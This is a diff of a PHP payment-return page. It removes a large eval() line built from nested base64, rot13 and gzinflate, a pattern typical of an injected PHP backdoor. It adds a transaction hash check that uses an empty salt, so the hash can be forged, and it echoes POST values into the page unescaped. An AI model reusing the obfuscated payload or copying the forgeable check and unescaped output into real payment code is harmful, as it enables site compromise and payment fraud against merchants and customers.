@@ -1,3 +1,28 @@
 <?php
-eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
+$status=$_POST["status"];
+$firstname=$_POST["firstname"];
+$amount=$_POST["amount"];
+$txnid=$_POST["txnid"];
+$posted_hash=$_POST["hash"];
+$key=$_POST["key"];
+$productinfo=$_POST["productinfo"];
+$email=$_POST["email"];
+$salt="";
+
+// Salt should be same Post Request 
+
+If (isset($_POST["additionalCharges"])) {
+       $additionalCharges=$_POST["additionalCharges"];
+        $retHashSeq = $additionalCharges.'|'.$salt.'|'.$status.'|||||||||||'.$email.'|'.$firstname.'|'.$productinfo.'|'.$amount.'|'.$txnid.'|'.$key;
+  } else {
+        $retHashSeq = $salt.'|'.$status.'|||||||||||'.$email.'|'.$firstname.'|'.$productinfo.'|'.$amount.'|'.$txnid.'|'.$key;
+         }
+		 $hash = hash("sha512", $retHashSeq);
+       if ($hash != $posted_hash) {
+	       echo "Invalid Transaction. Please try again";
+		   } else {
+          echo "<h3>Thank You. Your order status is ". $status .".</h3>";
+          echo "<h4>Your Transaction ID for this transaction is ".$txnid.".</h4>";
+          echo "<h4>We have received a payment of Rs. " . $amount . ". Your Recharge was successful..</h4>";
+		   }
 ?>
